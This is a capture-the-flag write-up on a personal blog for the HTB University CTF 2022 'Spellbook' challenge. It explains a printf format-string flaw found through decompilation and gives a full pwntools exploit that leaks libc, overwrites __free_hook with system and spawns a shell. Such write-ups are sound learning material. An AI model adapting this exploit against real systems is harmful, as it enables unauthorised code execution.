@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Spellbook - [HTB University CTF 2022] :: Hacklagr0y</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="The Challenge For this challenge, we have a binary named spellbook and a libc.so.6. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://alagroy-42.github.io/writeups/spellbook/" />
+
+
+
+
+<link rel="stylesheet" href="https://alagroy-42.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://alagroy-42.github.io/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://alagroy-42.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://alagroy-42.github.io/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="alagroy-" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Spellbook - [HTB University CTF 2022]">
+<meta property="og:description" content="The Challenge For this challenge, we have a binary named spellbook and a libc.so.6. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&amp;rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on." />
+<meta property="og:url" content="https://alagroy-42.github.io/writeups/spellbook/" />
+<meta property="og:site_name" content="Hacklagr0y" />
+
+  
+    <meta property="og:image" content="https://alagroy-42.github.io/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-12-06 16:43:40 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Home
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/ctfs/">CTFs</a></li>
+        
+      
+        
+          <li><a href="/malware">Malware</a></li>
+        
+      
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/ctfs/">CTFs</a></li>
+      
+    
+      
+        <li><a href="/malware">Malware</a></li>
+      
+    
+      
+        <li><a href="/tags/">Tags</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://alagroy-42.github.io/writeups/spellbook/">Spellbook - [HTB University CTF 2022]</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-12-06
+        
+      </span>
+    
+    
+      <span class="post-author">:: alagroy-</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://alagroy-42.github.io/tags/pwn/">Pwn</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/format-string/">Format string</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/medium/">Medium</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="the-challenge">The Challenge<a href="#the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>For this challenge, we have a binary named <code>spellbook</code> and a <code>libc.so.6</code>. After fuzzing the binary, we realize that it is a storage space that seems to contain 10 available indexes (0-9) to store information about a spell. Since no overflow seems obvious and that the access to the array seems to be safe, I couldn&rsquo;t find any obvious flaws in the program so I opened it in Ghidra to check what was actually going on.
+First, we can see in the built-in types the definition of a <code>struct Spls</code> defined as :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> Spls spl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Spls {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> type[<span style="color:#ae81ff">24</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> sp;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> power;
+</span></span><span style="display:flex;"><span>    undefined field3_0x24; <span style="color:#75715e">// Padding for alignement
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    undefined field4_0x25; <span style="color:#75715e">// Padding for alignement
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    undefined field5_0x26; <span style="color:#75715e">// Padding for alignement
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    undefined field6_0x27; <span style="color:#75715e">// Padding for alignement
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>Then, we notice a very interesting function called <code>show</code> that we can call from the menu. Here is its decompiled code :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span>    <span style="color:#a6e22e">show</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  ulong uVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  size_t idx;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f92672">&amp;</span>DAT_001017d8);
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> read_num();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((uVar2 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">&amp;&amp;</span> (table[uVar2] <span style="color:#f92672">!=</span> (spl <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f92672">&amp;</span>DAT_001019a8);
+</span></span><span style="display:flex;"><span>    printf(table[uVar2]<span style="color:#f92672">-&gt;</span>type);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f92672">&amp;</span>DAT_001019c6);
+</span></span><span style="display:flex;"><span>    printf(table[uVar2]<span style="color:#f92672">-&gt;</span>sp);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f92672">&amp;</span>DAT_00101800,<span style="color:#f92672">&amp;</span>DAT_001017f7,<span style="color:#f92672">&amp;</span>DAT_00101198);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is a simple function that displays an entry from the <code>spl</code> table. This function is using the <code>printf</code> function to do so, with some calls on data controlled by us. That allows us to use our data with a custom <code>printf</code> format string so that we can read/write data and eventually redirect the execution flow to get a shell.</p>
+<p>Disclaimer : The value of the flag is <code>HTB{f45tb1n_c0rrupt10n_0n_p4g3_gl1bc_2.23}</code> which means that the author of the challenge probably wanted us to use some heap exploitation technique to get the flag. However, any modern compiler emits a warning or sometimes an error when it comes to format string so it could not have been left there unintentionally. Maybe the author of the challenge thought that it was not exploitable but it actually was.</p>
+<p>I&rsquo;ll come back to why later but another interesting function from the binary is the <code>delete</code> function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">delete</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  spl <span style="color:#f92672">*</span>__ptr;
+</span></span><span style="display:flex;"><span>  ulong uVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  size_t idx;
+</span></span><span style="display:flex;"><span>  spl <span style="color:#f92672">*</span>ptr;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f92672">&amp;</span>DAT_001017d8);
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> read_num();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((uVar2 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">&amp;&amp;</span> (table[uVar2] <span style="color:#f92672">!=</span> (spl <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
+</span></span><span style="display:flex;"><span>    __ptr <span style="color:#f92672">=</span> table[uVar2];
+</span></span><span style="display:flex;"><span>    free(__ptr<span style="color:#f92672">-&gt;</span>sp);
+</span></span><span style="display:flex;"><span>    free(__ptr);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f92672">&amp;</span>DAT_00101978,<span style="color:#f92672">&amp;</span>DAT_001018d0,<span style="color:#f92672">&amp;</span>DAT_00101198);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f92672">&amp;</span>DAT_00101800,<span style="color:#f92672">&amp;</span>DAT_001017f7,<span style="color:#f92672">&amp;</span>DAT_00101198);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As we can see there, we can call the <code>free</code> function on any entry we want, which means that we can control the argument that we give it when it frees <code>__ptr-&gt;sp</code>.</p>
+<h2 id="the-exploit">The exploit<a href="#the-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h4 id="what-is-a-format-string-vulnerability-">What is a format string vulnerability ?<a href="#what-is-a-format-string-vulnerability-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>A format string vulnerability is a vulnerability which consists in sending <code>printf</code> formatting characters that will be interpreted as such by <code>printf</code>. The interesting formatters are <code>%s</code>, <code>%p</code> and <code>%n</code>. Even though a printing function like <code>printf</code> might seem harmless, those three formatters combined with minimum field width and positional arguments will allow us to control the execution of the binary.
+The first thing to understand is how arguments are passed to function in assembly language. The first six arguments respectively go in <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>. If a function needs more than six arguments, the other ones are passed on the stack (like in x86 32 bits). For long format strings that uses several times the same argument, <code>printf</code> implemented what is called positional arguments. It means that the following formatter <code>%n$x</code> will display the nth argument of <code>printf</code> as an hexadecimal number. Since arguments over 6 are supposed to be on the stack, it means that using <code>%7$p</code> will display the first element of the stack as a pointer. If this element is an actual pointer, <code>%7$s</code> will show us what is inside that address (until it reaches a <code>'\0'</code>).</p>
+<p>The last and most critical useful formatter is <code>%n</code>. <code>%n</code> takes an <code>int *</code> as an argument and will write the number of character <code>printf</code> already write when it reaches that formatter at this address. It means that using the minimum field width, we can print a specified number of characters to control the output of <code>%n</code> and write anything we want wherever we want (Note: even though, this is an <code>int *</code> that will write a 32 bits value, we can use the <code>hh</code> or <code>h</code> modifiers to only write 16 or 8 bits). If you didn&rsquo;t get that part, you should definitely read <code>printf</code>&rsquo;s man.</p>
+<h4 id="and-in-our-case-">And in our case ?<a href="#and-in-our-case-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>In this challenge, the string we display is located inside the heap which means that we have absolutely no control over the stack (for the moment). Let&rsquo;s open <code>gdb</code> and take a look at what the stack frame looks like when we call <code>printf</code>.</p>
+<p><img src="/spellbook_gdb.png" alt="gdb"></p>
+<p>There are 3 interesting values on that frame :</p>
+<ul>
+<li>the 3rd one : It is a pointer on the main return address, which is located one byte before a libc pointer</li>
+<li>the 8th one : It is a pointer to <code>__libc_start_main+240</code> which will help us leak the libc&rsquo;s address to defeat ASLR</li>
+<li>the 10th one : It is a pointer on a stack pointer, which means that we can use it as an argument to write the address we want to control on the stack and then use this address to arbitrarily write where we want</li>
+</ul>
+<p>Once we have everything we need to exploit this binary, here is how we will proceed: we will try to rewrite <code>__free_hook</code>&rsquo;s address to take control os the execution flow. <code>__free_hook</code> is global variable containing a function pointer called when <code>free</code> is called. It is set to <code>NULL</code> by default but by controlling it, we can control the execution when we call <code>free</code>. In the <code>delete</code> function, we have a <code>free(__ptr-&gt;sp);</code>. If we set <code>__free_hook</code>&rsquo;s value to <code>system</code>&rsquo;s address and that we free a spell having <code>/bin/sh</code> as a value, it will execute <code>system(&quot;/bin/sh&quot;)</code>. Since we cannot write an infinite number of character using <code>printf</code>, we will write <code>system</code>&rsquo;s address in three times, using two bytes chunks of this address.</p>
+<ol>
+<li>use <code>%13$p</code> to leak <code>__libc_start_main+240</code>&rsquo;s address so that we can find out where the libc is mapped in memory</li>
+<li>use <code>%8$p</code> to leak the pointer on <code>main</code>&rsquo;s return address so that, by adding eight to it, we have a pointer on libc (it will allow us to just take care of the low bytes since the high ones already have the right value)</li>
+<li>By writing using <code>%15$n</code> to the stack pointer, we will modify our 41th argument and make it point on the libc&rsquo;s address we want to modify. We can then use <code>%41$n</code> to set this pointer to <code>__free_hook</code>&rsquo;s address.</li>
+<li>In a loop, compute the 16 bits we want to write on <code>__free_hook</code>&rsquo;s address and then use <code>%13$n</code> to write them. Then use <code>$41$n</code> to update the value of <code>__free_hook</code>&rsquo;s address so that we can write the two next bytes of the address.</li>
+<li>Now that we have <code>__free_hook</code> pointing on <code>system</code>, we just have to create a spell having <code>&quot;/bin/sh&quot;</code> in <code>spl-&gt;sp</code> and then delete it to get a shell.</li>
+</ol>
+<p>Here is the script I made to get the flag :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./spellbook&#39;</span>
+</span></span><span style="display:flex;"><span>libname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./glibc/libc.so.6&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binname
+</span></span><span style="display:flex;"><span>binary <span style="color:#f92672">=</span> ELF(binname)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(libname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_spell</span>(io, entry, payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(payload) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;payload won&#39;t fit in the buffer&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(entry)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1000&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_spell</span>(io, entry):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(entry)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_spell</span>(io, entry, payload):
+</span></span><span style="display:flex;"><span>    add_spell(io, entry, payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> read_spell(io, entry)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_spell</span>(io, entry):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(entry)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_low_bytes</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(binname)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = remote(&#39;161.35.173.232&#39;, 31962)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_main_leak <span style="color:#f92672">=</span> int(get_spell(io, <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%13$p&#39;</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">240</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_main_leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>__libc_start_main
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;libc leak:&#39;</span>, hex(libc_main_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">240</span>))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;libc base:&#39;</span>, hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#f92672">=</span> int(get_spell(io, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%8$p&#39;</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>lolo_libc_start_main_address <span style="color:#f92672">=</span> (ret_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;ret addr  :&#39;</span>, hex(ret_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>__free_hook
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;free hook:&#39;</span>, hex(free_hook))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lolo_free_hook <span style="color:#f92672">=</span> free_hook <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>
+</span></span><span style="display:flex;"><span>hilo_free_hook <span style="color:#f92672">=</span> (free_hook <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff0000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>lolo_libc_start_main_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">x%15$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>get_spell(io, <span style="color:#ae81ff">2</span>, payload)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>hilo_free_hook<span style="color:#e6db74">}</span><span style="color:#e6db74">x%41$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>get_spell(io, <span style="color:#ae81ff">3</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>lolo_libc_start_main_address<span style="color:#e6db74">}</span><span style="color:#e6db74">x%15$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>get_spell(io, <span style="color:#ae81ff">4</span>, payload)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>lolo_free_hook<span style="color:#e6db74">}</span><span style="color:#e6db74">x%41$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>get_spell(io, <span style="color:#ae81ff">5</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;leak addr:&#39;</span>, hex(int(get_spell(io, <span style="color:#ae81ff">6</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%13$p&#39;</span>), <span style="color:#ae81ff">16</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    delete_spell(io, <span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>mask <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    mask <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>    mask <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0xffff</span>
+</span></span><span style="display:flex;"><span>    system_sub_addr <span style="color:#f92672">=</span> (system_addr <span style="color:#f92672">&amp;</span> mask) <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>system_sub_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">x%13$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    get_spell(io, entry, payload)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;%</span><span style="color:#e6db74">{</span>lolo_free_hook <span style="color:#f92672">+</span> ((i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">x%41$hn&#39;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    get_spell(io, entry <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, payload)
+</span></span><span style="display:flex;"><span>    entry <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_spell(io, <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</span></span><span style="display:flex;"><span>delete_spell(io, <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
